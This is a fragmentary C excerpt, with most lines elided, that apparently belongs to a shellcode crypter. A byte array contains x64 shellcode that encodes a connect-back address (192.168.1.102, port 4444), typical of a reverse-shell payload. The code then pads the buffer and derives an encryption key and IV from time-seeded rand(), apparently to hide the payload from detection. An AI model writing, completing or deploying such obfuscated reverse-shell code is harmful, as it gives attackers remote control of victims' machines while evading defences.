...
void generateKey(int8 *key, int size)
{
...
int main()
{
    ...
    unsigned char buf[] =
        ...
        "\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x66\x41\x54"
    ...
    addPadding(buf, sizeof(buf));

    int8 pKEY[KEYSIZE];
    int8 pIV[IVSIZE];

    srand(time(0));
    generateKey(pKEY, sizeof(pKEY));

    srand(time(0) ^ pKEY[0]);
    generateKey(pIV, sizeof(pIV));
